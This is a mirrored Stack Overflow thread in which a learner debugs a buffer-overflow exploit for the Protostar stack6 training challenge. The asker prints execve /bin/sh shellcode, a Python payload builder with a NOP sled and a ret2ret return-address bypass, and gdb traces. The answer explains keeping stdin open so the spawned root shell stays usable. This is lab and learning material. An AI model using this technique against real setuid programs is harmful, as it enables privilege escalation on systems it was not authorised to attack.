@@ -1,0 +1,282 @@
+<!DOCTYPE html><html lang="en"><head><title>Protostar Stack6 - Segfault for no reason?</title><link rel="stylesheet" href="/assets/main-css-J70jL4xZ9XDhEm610THio-liXvZQr6xchX4qGk0EF54.css" integrity="sha256-J70jL4xZ9XDhEm610THio+liXvZQr6xchX4qGk0EF54="/><link rel="canonical" href="https://windows-hexerror.linestarve.com/q/so63580576-protostar-stack6-segfault-for-no-reason"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+	google_ad_client: "ca-pub-1525579576977352",
+	enable_page_level_ads: true
+});
+</script></head><body><div class="container markdown-body" itemscope itemtype="http://schema.org/Question"><h1 itemprop="name">Protostar Stack6 - Segfault for no reason?</h1><div class="qa-container qa-full first-of-type"><div class="qa-sidebar"><div class="qa-voteinfo tooltipped tooltipped-e tooltipped-no-delay" aria-label="Sorry, you can't vote on questions yet."><div class="votearrow">&#x25b2;</div><span itemprop="upvoteCount">1</span><br><div class="votearrow">&#x25bc;</div></div><!-- TODO accepted?--></div><div class="qa-body"><div itemprop="text"><p>So I am doing the protostar challenges from <a href="http://exploit-exercises.lains.space/protostar/stack6/" rel="nofollow noreferrer">exploit exercises</a> and I'm completely stumped.
+Protostar runs on a virtual machine emulating an i686 processor.</p>
+<pre class="lang-sh prettyprint-override"><code>uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+</code></pre>
+<p>The challenge involves injecting a malformed user provided input to allow root access. The executable has the setuid flag set and has owner root. I provide my input via a named pipe in <code>/tmp/mypipe</code></p>
+<p>in gdb I run</p>
+<pre><code>set disassembly-flavor intel
+run &lt; /tmp/mypipe
+</code></pre>
+<p>When I set my breakpoint at the end of the getpath() function on the <code>RET</code> instruction and single step forward, everything works as expected. My shellcode gets executed. I verrified that the instructions are exactly the same as the documentation at <a href="http://shell-storm.org/shellcode/files/shellcode-811.php" rel="nofollow noreferrer">the source</a>. (Using a stop hook with <code>x/2i $eip</code> and single stepping through the assembler). Everything works just fine down the noop sled and the first few instructions, up until interrupt 0x80 (syscall) (<code>0xcd 0x80</code>).<br />
+The funny thing is gdb announces:</p>
+<blockquote>
+<p>Executing new program: /bin/dash</p>
+<p>Program received signal SIGSEGV, Segmentation fault.</p>
+</blockquote>
+<p>After that nothing works anymore. Running it again with the same input just segfaults. Trying to <code>disassemble main</code> yields <code>No symbol &quot;main&quot; in current context.</code><br />
+Once I close GDB and start again, it gives the same behavior as before. No shell is actually ever interactable. Using the same payload from the command line simply yields a segfault.</p>
+<p>I have tried numerous payloads made with msfvenom, all for x86 linux with different encoders, prohibiting 0x00, 0x0a and 0x0d. I tried putting small payloads into the buffer, i tried putting them behind the return address in the main stackframe and beyond. Everything I tried gives me a segfault. I'm confused as to why this isn't working. Has it perhaps something to do with overwriting EBP on the stack and then returning twice? But <code>LEAVE</code> isn't executed twice, only <code>RET</code>.</p>
+<p><strong>What's going on?</strong></p>
+<p>The code for the challenge is this:</p>
+<pre class="lang-c prettyprint-override"><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+  printf(&quot;input path please: &quot;); fflush(stdout);
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+  if((ret &amp; 0xbf000000) == 0xbf000000) {
+    printf(&quot;bzzzt (%p)\n&quot;, ret);
+    _exit(1);
+  }
+
+  printf(&quot;got path %s\n&quot;, buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+</code></pre>
+<p>Jumping to the stack is prohibited by program logic. So obviously you must jump somewhere else.
+My idea was to jump to the RET instruction at the end of <code>getpath()</code>, basically popping another address into EIP from the stack that is not checked by program logic.</p>
+<p>It turns out there are 80B from the top of the stack where <code>buf</code> starts to the first byte of the return pointer on the stack.</p>
+<p>My code for generating the malformed input looks like this.</p>
+<pre class="lang-py prettyprint-override"><code># execenv 28B from http://shell-storm.org/shellcode/files/shellcode-811.php
+buf = b&quot;&quot; 
+buf += b&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;
+buf += b&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;
+buf += b&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;
+buf += b&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;
+
+# start of buffer = 0xbffff64c
+# EIP return on stack = 0xbffff69c
+# difference = 80 B
+
+padding = &quot;A&quot;*80
+
+# use noop sled to avoid changing environment variables etc to mess with alignment
+noop = (b&quot;\x90&quot;)*0x40
+
+# addr of ret command (getpath function)
+eip = b&quot;\x08\x04\x84\xf9&quot;
+eip = eip[::-1]
+
+# shell code position
+eip2 = b&quot;\xbf\xff\xf6\xb0&quot;
+eip2 = eip2[::-1]
+
+print (padding + eip + eip2 + noop + buf)
+</code></pre>
+<p>Note: <code>eip = eip[::-1]</code> reverses the byte order because intel x86 is little endian.</p>
+<p>Edit:</p>
+<p>Here is a more detailed state of the machine.</p>
+<pre><code>disassemble getpath
+Dump of assembler code for function getpath:
+0x08048484 &lt;getpath+0&gt;: push   ebp
+0x08048485 &lt;getpath+1&gt;: mov    ebp,esp
+0x08048487 &lt;getpath+3&gt;: sub    esp,0x68
+0x0804848a &lt;getpath+6&gt;: mov    eax,0x80485d0
+0x0804848f &lt;getpath+11&gt;:    mov    DWORD PTR [esp],eax
+0x08048492 &lt;getpath+14&gt;:    call   0x80483c0 &lt;printf@plt&gt;
+0x08048497 &lt;getpath+19&gt;:    mov    eax,ds:0x8049720
+0x0804849c &lt;getpath+24&gt;:    mov    DWORD PTR [esp],eax
+0x0804849f &lt;getpath+27&gt;:    call   0x80483b0 &lt;fflush@plt&gt;
+0x080484a4 &lt;getpath+32&gt;:    lea    eax,[ebp-0x4c]
+0x080484a7 &lt;getpath+35&gt;:    mov    DWORD PTR [esp],eax
+0x080484aa &lt;getpath+38&gt;:    call   0x8048380 &lt;gets@plt&gt;
+0x080484af &lt;getpath+43&gt;:    mov    eax,DWORD PTR [ebp+0x4]
+0x080484b2 &lt;getpath+46&gt;:    mov    DWORD PTR [ebp-0xc],eax
+0x080484b5 &lt;getpath+49&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+0x080484b8 &lt;getpath+52&gt;:    and    eax,0xbf000000
+0x080484bd &lt;getpath+57&gt;:    cmp    eax,0xbf000000
+0x080484c2 &lt;getpath+62&gt;:    jne    0x80484e4 &lt;getpath+96&gt;
+0x080484c4 &lt;getpath+64&gt;:    mov    eax,0x80485e4
+0x080484c9 &lt;getpath+69&gt;:    mov    edx,DWORD PTR [ebp-0xc]
+0x080484cc &lt;getpath+72&gt;:    mov    DWORD PTR [esp+0x4],edx
+0x080484d0 &lt;getpath+76&gt;:    mov    DWORD PTR [esp],eax
+0x080484d3 &lt;getpath+79&gt;:    call   0x80483c0 &lt;printf@plt&gt;
+0x080484d8 &lt;getpath+84&gt;:    mov    DWORD PTR [esp],0x1
+0x080484df &lt;getpath+91&gt;:    call   0x80483a0 &lt;_exit@plt&gt;
+0x080484e4 &lt;getpath+96&gt;:    mov    eax,0x80485f0
+0x080484e9 &lt;getpath+101&gt;:   lea    edx,[ebp-0x4c]
+0x080484ec &lt;getpath+104&gt;:   mov    DWORD PTR [esp+0x4],edx
+0x080484f0 &lt;getpath+108&gt;:   mov    DWORD PTR [esp],eax
+0x080484f3 &lt;getpath+111&gt;:   call   0x80483c0 &lt;printf@plt&gt;
+0x080484f8 &lt;getpath+116&gt;:   leave  
+0x080484f9 &lt;getpath+117&gt;:   ret
+End of assembler dump.
+(gdb) b *0x080484f9
+Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
+(gdb) run &lt; /tmp/mypipe 
+Starting program: /opt/protostar/bin/stack6 &lt; /tmp/mypipe
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[... bunch of gibberish that can't be printed as text]
+
+Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
+23  stack6/stack6.c: No such file or directory.
+    in stack6/stack6.c
+(gdb) x /32wx $esp
+0xbffff69c: 0x080484f9  0xbffff6b0  0x90909090  0x90909090
+0xbffff6ac: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6bc: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6cc: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6dc: 0x90909090  0x90909090  0x6850c031  0x68732f2f
+0xbffff6ec: 0x69622f68  0x89e3896e  0xb0c289c1  0x3180cd0b
+0xbffff6fc: 0x80cd40c0  0x00000000  0x00000000  0x00000001
+0xbffff70c: 0x080483d0  0x00000000  0xb7ff6210  0xb7eadb9b
+</code></pre>
+<p>As you can see the function skipped the bzzz + exit because the return address passed the check. The next instruction is ret which returns to <code>0x080484f9</code> (top of stack at $esp). Which is ret.</p>
+<p>One step forward</p>
+<pre><code>(gdb) stepi
+eip            0x80484f9    0x80484f9 &lt;getpath+117&gt;
+esp            0xbffff6a0   0xbffff6a0
+eax            0xbe 190
+ebx            0xb7fd7ff4   -1208123404
+0x80484f9 &lt;getpath+117&gt;:    ret    
+0x80484fa &lt;main&gt;:   push   ebp
+0xbffff6a0: 0xbffff6b0  0x90909090  0x90909090  0x90909090
+0xbffff6b0: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6c0: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6d0: 0x90909090  0x90909090  0x90909090  0x90909090
+
+Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
+23  in stack6/stack6.c
+</code></pre>
+<p>and another</p>
+<pre><code>Cannot access memory at address 0x41414145
+</code></pre>
+<p>I'm not sure what that's about or why the hook-stop didn't fire or where the 0x45 came from, but</p>
+<pre><code>(gdb) i r
+eax            0xbe 190
+ecx            0x0  0
+edx            0xb7fd9340   -1208118464
+ebx            0xb7fd7ff4   -1208123404
+esp            0xbffff6a4   0xbffff6a4
+ebp            0x41414141   0x41414141
+esi            0x0  0
+edi            0x0  0
+eip            0xbffff6b0   0xbffff6b0
+eflags         0x200296 [ PF AF SF IF ID ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0  0
+gs             0x33 51
+</code></pre>
+<p>As you can see EIP points to the noop sled.</p>
+<pre><code>(gdb) x /60i $eip
+0xbffff6b0: nop
+0xbffff6b1: nop
+0xbffff6b2: nop
+[snip]
+0xbffff6e2: nop
+0xbffff6e3: nop
+0xbffff6e4: xor    eax,eax
+0xbffff6e6: push   eax
+0xbffff6e7: push   0x68732f2f
+0xbffff6ec: push   0x6e69622f
+0xbffff6f1: mov    ebx,esp
+0xbffff6f3: mov    ecx,eax
+0xbffff6f5: mov    edx,eax
+0xbffff6f7: mov    al,0xb
+</code></pre>
+<p>from there it executes along nicely up to int 80 where it segfaults.</p>
+<pre><code>(gdb) x /12i $eip
+[skipping all the nops up to here]
+0xbffff6e4: xor    eax,eax
+0xbffff6e6: push   eax
+0xbffff6e7: push   0x68732f2f
+0xbffff6ec: push   0x6e69622f
+0xbffff6f1: mov    ebx,esp
+0xbffff6f3: mov    ecx,eax
+0xbffff6f5: mov    edx,eax
+0xbffff6f7: mov    al,0xb
+0xbffff6f9: int    0x80
+0xbffff6fb: xor    eax,eax
+0xbffff6fd: inc    eax
+0xbffff6fe: int    0x80
+</code></pre>
+<pre><code>(gdb) 
+eip            0xbffff6f9   0xbffff6f9
+esp            0xbffff698   0xbffff698
+eax            0xb  11
+ebx            0xbffff698   -1073744232
+0xbffff6f9: int    0x80
+0xbffff6fb: xor    eax,eax
+0xbffff698: 0x6e69622f  0x68732f2f  0x00000000  0x90909090
+0xbffff6a8: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6b8: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6c8: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff6f9 in ?? ()
+(gdb) 
+Executing new program: /bin/dash
+
+Program received signal SIGSEGV, Segmentation fault.
+eip            0x805925e    0x805925e
+esp            0xbffffcd0   0xbffffcd0
+eax            0x3e9    1001
+ebx            0xb7fd7ff4   -1208123404
+0x805925e:  mov    ebx,DWORD PTR [esi]
+0x8059260:  test   ebx,ebx
+0xbffffcd0: 0x00000011  0x00000000  0x00000000  0xbffffd70
+0xbffffce0: 0xbffffd28  0xbffffd34  0x00000000  0xb7fff8f8
+0xbffffcf0: 0x00000000  0xb7ffc3e1  0xb7ffb8bc  0x08048bdd
+0xbffffd00: 0x00000000  0xb7fe3494  0xbffffd44  0xb7fe3612
+0x0805925e in ?? ()
+
+(gdb) x /5i 0x805925e
+0x805925e:  mov    ebx,DWORD PTR [esi]
+0x8059260:  test   ebx,ebx
+0x8059262:  je     0x8059295
+0x8059264:  lea    esi,[esi+eiz*1+0x0]
+0x8059268:  mov    DWORD PTR [esp+0x4],0x3d
+(gdb) i r
+eax            0x3e9    1001
+ecx            0xa  10
+edx            0x805c340    134595392
+ebx            0xb7fd7ff4   -1208123404
+esp            0xbffffcd0   0xbffffcd0
+ebp            0xbffffd98   0xbffffd98
+esi            0x0  0
+edi            0x0  0
+eip            0x805925e    0x805925e
+eflags         0x210282 [ SF IF RF ID ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0  0
+gs             0x33 51
+</code></pre>
+<p>Edit 2:</p>
+<p>I ran the exploit from a file instead of a pipe. I get an odd result. I still don't know what to make of it.</p>
+<pre><code>(gdb) run &lt; /tmp/exploit 
+Starting program: /opt/protostar/bin/stack6 &lt; /tmp/exploit
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA���������������������������������������������������������������������1�Ph//shh/bin����°
+                1�@̀
+Executing new program: /bin/dash
+
+Program exited normally.
+Error while running hook_stop:
+The program has no registers now.
+</code></pre>
+</div><div class="tags"><div class="tag">c</div><div class="tag">assembly</div><div class="tag">x86</div><div class="tag">gdb</div><div class="tag">buffer-overflow</div></div><div class="qa-attribution">asked <a href="https://stackoverflow.com/questions/63580576/protostar-stack6-segfault-for-no-reason">on Stack Overflow</a> Aug 25, 2020 by <a href="https://stackoverflow.com/users/10263660/falcoger"><img src="https://www.gravatar.com/avatar/d02f3119d15c8c155ff25968fdf5a145?s=16&amp;d=identicon&amp;r=PG&amp;f=1" width="16" height="16" alt=""> FalcoGer</a> &bull; edited Aug 25, 2020 by <a href="https://stackoverflow.com/users/10263660/falcoger"><img src="https://www.gravatar.com/avatar/d02f3119d15c8c155ff25968fdf5a145?s=16&amp;d=identicon&amp;r=PG&amp;f=1" width="16" height="16" alt=""> FalcoGer</a></div></div></div><h2><span itemprop="answerCount">1</span> Answer</h2><div class="qa-container qa-full first-of-type" id="sx-stackoverflow-63586378" itemscope itemtype="http://schema.org/Answer"><div class="qa-sidebar"><div class="qa-voteinfo tooltipped tooltipped-e tooltipped-no-delay" aria-label="Sorry, you can't vote on answers yet."><div class="votearrow">&#x25b2;</div><span itemprop="upvoteCount">1</span><br><div class="votearrow">&#x25bc;</div></div><!-- TODO accepted?--></div><div class="qa-body"><div itemprop="text"><p>When piping or routing input into the program then stdin basically ceases to exist when the providing source is at the end of it's output or terminates. Therefore you don't get a shell.</p>
+<p>Disassemble main didn't work anymore at the instances with that behavior because the program being loaded by gdb no longer is stack6 but /bin/sh. Executing Run again would execute /bin/sh.</p>
+<p>I have no idea why the program segfaulted when the piped input ran out.  But with the file the interrupt 80 did not segfault and afterwards it ran interrupt 80 with eax = 1 calling exit(ebx), leading to normal termination.</p>
+<p>To execute the exploit, you need shell code that doesn't need stdin input, such as a metasploit reverse tcp bind shell or you need to provide continuous input after the exploit was executed. For example like this:</p>
+<pre class="lang-sh prettyprint-override"><code>(cat /tmp/exploit; cat) | ./stack6
+</code></pre>
+<p>which will first input the exploit into the program and then ask the user for more input on stdin (cat) and pipe that to the program afterwards.</p>
+</div><div class="qa-attribution">answered <a href="https://stackoverflow.com/questions/63580576/protostar-stack6-segfault-for-no-reason/63586378#63586378">on Stack Overflow</a> Aug 25, 2020 by <a href="https://stackoverflow.com/users/10263660/falcoger"><img src="https://www.gravatar.com/avatar/d02f3119d15c8c155ff25968fdf5a145?s=16&amp;d=identicon&amp;r=PG&amp;f=1" width="16" height="16" alt=""> FalcoGer</a> &bull; edited Aug 26, 2020 by <a href="https://stackoverflow.com/users/10263660/falcoger"><img src="https://www.gravatar.com/avatar/d02f3119d15c8c155ff25968fdf5a145?s=16&amp;d=identicon&amp;r=PG&amp;f=1" width="16" height="16" alt=""> FalcoGer</a></div></div></div><hr><p class="container">User contributions licensed under <a href="https://creativecommons.org/licenses/by-sa/3.0/">CC BY-SA 3.0</a></p><script type="text/javascript" src="/assets/vend-js-ECgNvG-oXgP7Ca24MRcZ831qDcNq2M5AahAhJRksgtI.js" integrity="sha256-ECgNvG+oXgP7Ca24MRcZ831qDcNq2M5AahAhJRksgtI="></script><script type="text/javascript" src="/assets/cust-js-ZONKvaIwPRDoYEqWdyhagYZfqo_vT6evY1jwUSHh31o.js" integrity="sha256-ZONKvaIwPRDoYEqWdyhagYZfqo/vT6evY1jwUSHh31o="></script><script src="https://analytics.linestarve.com/piwik.js"></script><noscript><p><img src="https://analytics.linestarve.com/piwik.php?idsite=6&amp;rec=1" style="border:0;" alt=""></p></noscript></div></body></html>
